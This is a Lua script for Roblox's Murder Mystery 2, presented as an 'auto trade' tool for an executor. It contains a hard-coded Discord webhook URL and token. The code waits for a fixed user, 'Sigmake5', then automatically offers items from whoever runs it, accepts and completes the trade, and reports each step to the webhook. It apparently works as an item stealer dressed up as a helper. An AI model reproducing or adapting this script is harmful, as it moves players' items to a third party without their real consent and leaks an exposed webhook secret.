-- MM2 AUTO TRADE SCRIPT FOR DELTA
-- Uses the actual remote events from your debug
-- Test on alt account first

local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
local TARGET_USER = "Sigmake5"

local player = game.Players.LocalPlayer
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- Discord log
local function sendLog(msg)
    pcall(function()
        local data = HttpService:JSONEncode({content = "**MM2 Trade**\n" .. tostring(msg)})
        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
    end)
end

-- These are the REAL remotes from your debug
local remotes = {
    StartTrade = ReplicatedStorage:FindFirstChild("StartTrade"),
    AcceptTrade = ReplicatedStorage:FindFirstChild("AcceptTrade"),
    OfferItem = ReplicatedStorage:FindFirstChild("OfferItem"),
    CompleteTrade = ReplicatedStorage:FindFirstChild("CompleteTrade"),
    AcceptRequest = ReplicatedStorage:FindFirstChild("AcceptRequest"),
    GetInventory = ReplicatedStorage:FindFirstChild("GetInventory")
}

sendLog("Script loaded - Found remotes: " .. tostring(remotes.StartTrade ~= nil))

-- Get items from MM2's actual inventory system
local function getInventoryItems()
    local items = {}
    
    -- Method 1: Get items from the trade GUI inventory
    pcall(function()
        local tradeFrame = player.PlayerGui:FindFirstChild("Trade")
        if tradeFrame then
            local inventoryFrame = tradeFrame:FindFirstChild("Inventory")
            if inventoryFrame then
                for _, button in pairs(inventoryFrame:GetDescendants()) do
                    if button:IsA("ImageButton") and button.Parent ~= inventoryFrame then
                        table.insert(items, button)
                    end
                end
            end
        end
    end)
    
    -- Method 2: Request inventory via remote
    if remotes.GetInventory then
        pcall(function()
            local inventory = remotes.GetInventory:InvokeServer()
            if inventory then
                for _, item in pairs(inventory) do
                    table.insert(items, item)
                end
            end
        end)
    end
    
    return items
end

-- Send trade request
local function sendTrade(target)
    if remotes.StartTrade then
        remotes.StartTrade:FireServer(target)
        sendLog("Trade request sent to " .. TARGET_USER)
        return true
    end
    return false
end

-- Accept incoming request
local function acceptRequest()
    if remotes.AcceptRequest then
        remotes.AcceptRequest:FireServer()
        sendLog("Request accepted")
        return true
    end
    return false
end

-- Offer item
local function offerItem(item)
    if remotes.OfferItem then
        remotes.OfferItem:FireServer(item)
        sendLog("Offered item")
        return true
    end
    return false
end

-- Accept trade
local function acceptTrade()
    if remotes.AcceptTrade then
        remotes.AcceptTrade:FireServer()
        sendLog("Trade accepted")
        return true
    end
    return false
end

-- Complete trade
local function completeTrade()
    if remotes.CompleteTrade then
        remotes.CompleteTrade:FireServer()
        sendLog("Trade completed")
        return true
    end
    return false
end

-- Listen for Sigmake5's responses
local function setupListener()
    -- Listen for trade response
    local tradeResponse = ReplicatedStorage:FindFirstChild("TradeResponse")
    if tradeResponse then
        tradeResponse.OnClientEvent:Connect(function(sender, accepted)
            if sender and sender.Name == TARGET_USER and accepted then
                sendLog(TARGET_USER .. " accepted trade!")
                
                -- Get and offer items
                local items = getInventoryItems()
                for i = 1, math.min(4, #items) do
                    wait(0.3)
                    offerItem(items[i])
                end
                
                wait(1)
                acceptTrade()
                wait(0.5)
                completeTrade()
                sendLog("Trade completed with " .. TARGET_USER)
            end
        end)
    end
end

-- Main trade function
local trading = false

local function startTrade()
    if trading then return end
    trading = true
    
    sendLog("Starting trade with " .. TARGET_USER)
    
    -- Send trade request
    if not sendTrade(player) then
        sendLog("Failed to send trade - remote not found")
        trading = false
        return
    end
    
    -- Wait for response (handled by listener)
    wait(30)
    trading = false
end

-- Watch for target joining
local function watch()
    sendLog("Watching for " .. TARGET_USER)
    
    -- Check existing
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name == TARGET_USER then
            sendLog(TARGET_USER .. " already in server")
            wait(2)
            startTrade()
            return
        end
    end
    
    -- Watch for join
    Players.PlayerAdded:Connect(function(plr)
        if plr.Name == TARGET_USER then
            sendLog(TARGET_USER .. " joined!")
            wait(3)
            startTrade()
        end
    end)
end

-- Setup listener
setupListener()

-- Start
sendLog("MM2 Auto Trade Active")
watch()

print("✅ Script Active - Waiting for Sigmake5")
